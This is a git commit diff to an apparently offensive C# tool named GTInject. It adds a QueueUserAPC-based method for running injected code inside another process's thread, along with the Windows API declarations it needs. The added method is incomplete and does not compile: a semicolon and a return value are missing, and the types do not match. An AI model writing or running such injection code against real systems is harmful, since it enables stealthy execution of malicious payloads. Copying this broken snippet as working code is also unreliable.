99f3694354657e98ba5527865cd9f3395b858045
Gary Lobermier <gary.lobermier@globetech.biz>
2023-11-27 13:41:55 -0600

    small added, exec opt 2

--- GTInject/Injection/threadexec.cs
+++ GTInject/Injection/threadexec.cs
@@ -17,6 +17,9 @@ namespace GTInject.Injection
                     return execopt1(memaddr, pid, tid);
                     break;
                 case 2:
+                    return execopt2(memaddr, pid, tid);
+                    break;
+                case 3:
                     return IntPtr.Zero;
                     break;
             }
@@ -34,6 +37,19 @@ namespace GTInject.Injection
             return remoteThreadResp;
         }
 
+        private static IntPtr execopt2(IntPtr memaddr, Process ProcID, int ThreadID) 
+        {
+            /////////////////////////////////////
+            // OPTION 2 == QueueUserAPC & ResumeThread
+            /////////////////////////////////////
+            
+            var threadHandle = OpenThread(QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            IntPtr QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero)
+
+            // Test this, recall not needing any additional actions if submitting a thread in the wait states already
+            //var ResThreadResp = ResumeThread(threadHandle);
+        }
+
         /////////////////////////////////////
         // Supporting functions
         /////////////////////////////////////
@@ -42,9 +58,31 @@ namespace GTInject.Injection
         /////////////////////////////////////
         // PInvokes and Enums / Structures
         /////////////////////////////////////
+        [Flags]
+        public enum    ThreadAccess : int
+        {
+            TERMINATE           = (0x0001)  ,
+            SUSPEND_RESUME      = (0x0002)  ,
+            GET_CONTEXT         = (0x0008)  ,
+            SET_CONTEXT         = (0x0010)  ,
+            SET_INFORMATION     = (0x0020)  ,
+            QUERY_INFORMATION       = (0x0040)  ,
+            SET_THREAD_TOKEN    = (0x0080)  ,
+            IMPERSONATE         = (0x0100)  ,
+            DIRECT_IMPERSONATION    = (0x0200)
+        }
+        
         [DllImport("kernel32.dll")]
         public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);
+
+        [DllImport("kernel32.dll")]
+        public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+        [DllImport("kernel32.dll")]
+        public static extern uint ResumeThread(IntPtr hThread);
 
     }
 }
